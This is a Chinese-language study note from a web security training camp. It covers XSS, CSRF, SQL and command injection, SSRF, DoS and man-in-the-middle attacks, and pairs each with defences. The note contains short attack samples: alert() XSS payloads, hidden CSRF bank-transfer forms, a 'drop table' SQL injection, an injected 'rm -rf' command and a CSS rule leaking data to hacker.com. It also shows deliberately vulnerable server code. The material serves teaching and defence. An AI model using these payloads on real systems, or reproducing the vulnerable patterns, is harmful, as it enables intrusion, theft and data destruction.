---
title: WEB 开发的安全之旅 - 字节青训营
date: 2022/1/27
updated: 2022/1/27
comments:
tags:
 - 前端安全
 - 青训营
categories:
 - learningNotes
layout:
permalink:
meta: true
---


> 两个角度看安全：hacker 攻击、开发者 防御

## 攻击者

### XSS — Cross-Site Scripting

攻击者在网站上提交一段恶意脚本 \<script>\</script> ，网站将其当成自身dom执行编译。

 

+ 主要利用了：
  + 盲目信任用户提交内容
  + 把用户提交的string 直接转化为 DOM
    + document.write
    + element.innerHTML = anyString;
    + SSR(user_data) 

+ 特点：
  + 难以从 UI 上感知，暗地执行脚本
  +  窃取用户信息 cookie/token
  + 绘制 UI 例如弹窗，诱骗用户点击 / 填写表单



#### 存储型 Stored XSS：

+ 恶意脚本被**存放在数据库**中
+ 访问页面 -> 读数据 == 被攻击
+ 危害最大，对全部用户都可见

#### 反射型 Reflected：

+ 不涉及数据库

+ **从 URL 上攻击**

  ~~~js
  // 例如 url 为 
  // host/path/?param=<script>alert('123')</script>
  public async render(ctx){
      const { param } = ctx.query;
      ctx.status = 200;
      ctx.body = `<div>${ param }</div>`
  }
  ~~~
  
  

#### 基于 dom DOM-based：

+ 不需要服务器的参与

+ 恶意攻击的发起 + 执行，**全在浏览器完成**

  ~~~js
  // 例如 url 为 
  // host/path/?param=<script>alert('123')</script>
  const content = new URL(location.href).searchParams.get("param");
  const div = document.createElement('div');
  div.innerHTML = content;
  document.body.append(div)
  ~~~

  > 与反射型很像，区别在于 完成注入脚本的地方：反射型在 server端、DOM 在浏览器完成闭环

####  基于 mutation Mutation-based：

+ 利用了浏览器渲染 DOM 的特性 – 独特优化

+ 不同浏览器，会有区别 – 按浏览器进行攻击

  ~~~html
  <noscript><p title="</noscript><img src=x onerror=alert()>">
  // 为
  <div>
      <noscript> <p title=" </noscript>
      <img src="x" onerror="alert(1)">
      """>"
  </div>
  ~~~

  



### CSRF 跨站伪造请求 — Cross-site request forgery

在用户不知情的前提下，利用用户权限 cookie，构造指定 HTTP 请求，窃取或修改用户铭感信息

例子：银行转账

#### GET

~~~html
<a href="https://bank.com/transfer?to=hacker&amount=100">点我抽奖</a>
    
<img style="display:none;" src="https://bank.com/transfer?to=hacker&amount=100" />
~~~

#### POST

~~~html
<form action="https://bank.com/transfer_tons_of_money" method="POST">
    <input name="amount" value="10000" type="hidden"/>
    <input name="to" value="hacker" type="hidden"/>
</from>
~~~



### Injection 注入 

#### SQL

请求：SQL 参数 恶意注入

Server：运行 SQL code

获取其他数据、修改数据、删除数据…

~~~js
// 读取请求字段  直接以字符串的形式拼接 SQL 语句
public async renderForm(ctx){
    const { username, form_id } = ctx.query;
    const result = await aql.query(`
		select a,b,c from table
		where username = ${username}
		and form_id = ${ from_id }
	`);
    ctx.body = renderForm(result);
}

// 攻击者
fetch("/api",{
    method:"POST",
    headers:{
        "Content-Type":"application/json"
    },
    body:JSON.stringify({
        username: "any; drop table tabelname;"
    })
})

// 造成 select xxx from xxx drop table tablename 删库跑路
~~~



#### Injection 不止于 SQL

+ CLI 命令行

+ OS command 系统命令

  ~~~js
  // 视频格式转换
  public async convertVideo(ctx){
      const { video, options } = ctx.request.body;
      exec(`convert-cli ${ video } -o ${ options }`);
      ctx.body = "ok";
  } 
  
  // 攻击
  fetch("/api", {
      method: "POST",
      body: JSON.stringify({
          options:`' && rm -rf xxx`
      })
  });
  
  // 生成 删除系统文件的命令 
  const command = `convert-cli video -o && rm -rf xxx`
  
  ~~~

  > 除了删除还能进行 读取 修改

+ Server-Side Request Forgery — ssrf，服务端伪造请求

  > 严格上说不是 injection ，但是原理类似

  ~~~js
  // 请求 用户自定义 的callback url
  // web server 通常有内网访问权限
  public async webhook(ctx){
      // callback 可能是内网 url 
      // e.g http://secret.com/get_employ_payrolls
      ctx.body = await fetch(ctx.query.callback);
  }
  
  // 访问 callback === 暴露内网信息
  ~~~

  

### Dos — Denial of Service

通过某种方式 构造特定请求，导致服务器资源被显著消耗，来不及响应更多请求，导致请求挤压，进而雪崩效应

#### ReDos：基于正则表达式的 Dos

贪婪：n 次不行？n-1次再试试 — 回溯

> 正则表达式的贪婪模式：
>
> 重复匹配时 `?`  与 `no ?`  满足`一个即可 ` 与 `尽量多`
>
> ~~~js
> const greedyRegExp = "/a+/";  // 有多少匹配多少
> const nonGreedyRegExp = "/a+?/" // 有一个就可以
> const str = "aaaaa";
> console.log(str.match(greedyRegExp)[0]) //aaaaa
> console.log(str.match(nonGreedyRegExp)[0]) //a
> ~~~



#### Logical Dos

+ 耗时的同步操作
+ 数据库写入
+ SQL join
+ 文件备份
+ 循环执行逻辑



#### DDos — Distributed Dos 

短时间内，来自大量僵尸设备的请求流量，服务器不能及时完成全部请求，导致请求堆积，进而雪崩效应，无法响应新请求。

特点：直接访问 IP、任意 API、消耗大量带宽

demo：SYN Flood 洪水攻击：攻击者发送很多 SYN 与服务器进行连接，但是不进行确认连接，

​              导致，握手没有完成， connection 不能被释放，达到最大可连接数，无法连接新请求



### 传输层 — 中间人攻击

<img src = 'https://i.bmp.ovh/imgs/2022/01/3c7be4efb4995095.png' style="zoom: 50%;" />

原因：

+ 明文传输
+ 信息篡改不可知
+ 对方身份未验证



## 防御篇

### XSS

+ 永远不信任用户的提交内容
+ 不要将用户提交内容直接转换成 DOM

+ 现成工具：
  + 前端：主流框架默认防御 xss、google-closure-library
  + 服务端 node：DOMPurify

+ 用户需求：需要动态生成 DOM，需要注意的点：
  + string 转 DOM：注意转译 new DOMParse()

  + 上传 svg：对其进行扫描，避免生成图片

    ~~~html
    <svg>
        <script>alert("xss")</script>
    </svg>
    ~~~

  + 自定义跳转链接：要过滤，因为可以写js

    ~~~html
    <a href="javascript:alert('xss')"></a>
    ~~~

  + 自定义样式：

    ~~~css
    input[type=radio].income-gt10k:checked{
        background: url("https://hacker.com/?income=gt10k")
    }
    ~~~

    

### CSP - Content Security Policy 内容安全策略

+ 哪些源被认为是安全的
+ 来自安全源的脚本可以执行，否则直接抛错
+ 禁止 eval + inline script 

设置的方式：

1. 服务器的响应头部：

   ~~~js
   Content-Security-Policy: script-src 'self' // 同源
   Content-Security-Policy: script-src 'self' https://domain.com //同源加 后面这个可以访问
   ~~~

2. 浏览器 meta：

   ~~~html
   <meta htpp-eqiuv="Content-Security-Policy" content="script-src self" />
   ~~~

   

### CSRF

因为其是**伪造请求**，是**异常来源**，then **限制请求来源**，也就**限制了 伪造请求**

+ 方法
  + 服务端开发人员可以通过校验 **Origin (同源请求中，GET + HEAD 不发送)，Referer（更广泛应用）**

  + token：

    Browser      →1. 请求页面 →            Server

    ​                    ← 2.页面 + token ←

    ​                     →3. 请求API+token →

    ​                     ← 4.验证 token + 数据←

  注意：

  1. 要进行用户绑定 
  2. 要设置过期时间

  > 因为 请求来自合法页面，服务器接收过页面请求，服务器就可以表示

#### CSRF — iframe 攻击

因为这样就是同源的发送请求了，没办法用 Origin 限制了，

+ 方法

  使用 响应头部：`X-Frame-Options:deny/sameorigin`

  deny：不能访问

  sameorigin：同源可以访问

#### CSRF anti-pattern

GET != GET + POST、明确 get、post 请求各自的功能

> 如果写成下面的样子，攻击者很容易一石二鸟

~~~js
// 将更新 获取 逻辑放到同一个 get
public async getAndUpdate(ctx){
    const { update, id } = ctx.query;
    if(update){
        await this.update(update);
    }
    ctx.body = await this.get(id);
}
~~~



#### 避免用户信息被携带：SameSite Cookie

从根源上解决了 csrf，csrf 是利用用户权限及 cookie，去伪造自己是该用户来进行恶意操作，如果攻击者无法获取到 用户的 cookie 那就没用办法进行伪造了。

sameSite 限制了 **cookie domain、页面域名；**

> 如果是有 cookie 依赖第三方服务的，可以设置 
>
> `Set-Cookie: SameSite=None; Secure;`



SameSite 与 CORS 对比：

SameSite：Cookie 发送、domain 与 页面域名

CORS：资源读写 http请求、资源域名 与 页面域名、白名单



#### 正确防御 CSRF — 中间件



## Injection

#### SQL

找到项目中查询 SQL 的地方，使用 prepared statement

#### beyond SQL

1. 最小权限原则

   不允许访问 sudo || root

2. 建立允许名单 + 过滤

   不允许进行 rm 这种系统操作

3. 对 URL 类型参数进行协议、域名、ip等限制

   禁止访问内网



## DoS

#### Regex DoS

1. 进行 code review，避免出现 贪婪模式的 正则
2. 代码扫描 + 正则性能测试
3. 禁止使用用户提供的正则

#### Logical Dos

1. 不是非黑即白：有些情况只有再在请求量大到一定之后才会体现
2. 分析代码中的性能瓶颈
3. 限流

#### DDos

1. 流量治理
   + 负载均衡 – 过滤
   + api 网关 – 过滤
   + cdn – 抗量
2. 快速自动扩容 – 抗量 
3. 非核心服务降级 – 抗量



## 传输层 — 防御中间人

使用 https = http + TLS

https的特性：

+ 可靠性：加密，非明文传输
+ 完整性：MAC 验证，禁止篡改   — 通过 验证 hash
+ 不可抵赖性：数字签名，进行身份验证  — 密码学



#### HSTS - HTTP Strict-Transport-Security

将 HTTP 升级到 HTTPS

设置请求头：`Strict-Transport-Security：max-age=3600`

#### SRI — Subresource Integrity

防止 CDN 静态资源被篡改：对比 hash



#### Feature / Permission Policy

限制一个页面下，可以使用哪些功能

iframe 也可以通过 allow=“xxx” 设置

